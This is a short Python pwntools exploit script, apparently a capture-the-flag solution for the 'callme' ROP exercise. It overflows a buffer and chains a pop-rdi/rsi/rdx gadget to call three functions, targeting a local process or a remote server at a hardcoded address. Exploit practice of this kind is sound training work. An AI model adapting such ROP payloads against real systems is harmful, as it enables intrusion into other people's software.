#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
context.arch = 'i386'

local = 1

if local:
	cn = process('./callme')
	# bin = ELF('./task_shoppingCart',checksec=False)
	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	# libc = ELF('/lib/i386-linux-gnu/libc.so.6',checksec=False)

else:
	cn = remote('117.78.27.105', 30403)
	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	pass


def z(a=''):
	if local:
		gdb.attach(cn,a)
		if a == '':
			raw_input()

callme_three = 0x401810
callme_two = 0x0401870
callme_one = 0x0401850
pop_3_add = 0x0401ab0 #pop rdi ; pop rsi ; pop rdx ; ret

# z('b*0x0401A55\nc')

payload = 'A'*0x20+ p64(0)
payload += p64(pop_3_add)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(callme_one)

payload += p64(pop_3_add)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(callme_two)

payload += p64(pop_3_add)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(callme_three)

cn.recv()
print payload
cn.sendline(payload)


cn.interactive()
